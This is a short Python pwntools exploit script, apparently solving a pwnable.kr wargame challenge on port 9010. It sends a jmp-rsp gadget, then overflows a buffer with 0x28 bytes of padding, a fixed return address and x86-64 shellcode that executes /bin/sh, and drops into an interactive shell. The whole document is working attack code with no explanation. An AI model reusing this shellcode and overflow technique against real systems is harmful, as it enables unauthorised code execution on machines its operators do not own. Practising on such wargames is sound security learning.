import pwn
from struct import pack,unpack

#s = pwn.tubes.remote.remote('localhost',4444)
s = pwn.tubes.remote.remote('pwnable.kr',9010)

shellcode = '\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'

#raw_input('debug')

print s.sendlineafter(':','\xff\xe4')
print s.sendlineafter('>','1')
print s.sendlineafter('\xff\xe4','a'*0x28+pack('Q',0x00000000006020A0)+shellcode)

s.interactive()
